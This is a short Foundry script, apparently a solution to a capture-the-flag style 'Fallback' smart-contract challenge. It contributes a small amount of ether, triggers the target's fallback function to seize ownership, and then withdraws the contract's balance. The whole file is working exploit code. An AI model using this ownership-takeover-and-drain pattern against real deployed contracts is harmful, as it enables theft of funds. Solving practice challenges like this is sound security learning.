// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "../src/01_Fallback.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FallbackAttack is Script {
    Fallback fallbackAttack = Fallback(payable(0xdeB300C6e013BbCa7891962c4e78A11d41161479));

    function run() external payable {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        fallbackAttack.contribute{value: 1}();

        console.log("Owner:", fallbackAttack.owner());
        (bool sent,) = address(fallbackAttack).call{value: 1}("");
        require(sent);
        fallbackAttack.withdraw();
        console.log("Owner:", fallbackAttack.owner());

        vm.stopBroadcast();
    }
}
